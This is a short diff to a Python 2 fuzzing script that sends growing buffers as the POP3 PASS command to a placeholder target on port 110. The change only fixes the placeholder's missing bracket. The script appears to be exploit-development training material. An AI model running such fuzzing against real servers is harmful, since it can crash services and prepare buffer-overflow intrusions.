@@ -9,7 +9,7 @@ while len(buffer) <= 30:
 for string in buffer:
 	print "Fuzzing PASS with %s bytes" % len(string)
 	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	connect=s.connect(('<TARGET_IP_ADDRESS',110))
+	connect=s.connect(('<TARGET_IP_ADDRESS>',110))
 	s.recv(1024)
 	s.send('USER test\r\n')
 	s.recv(1024)
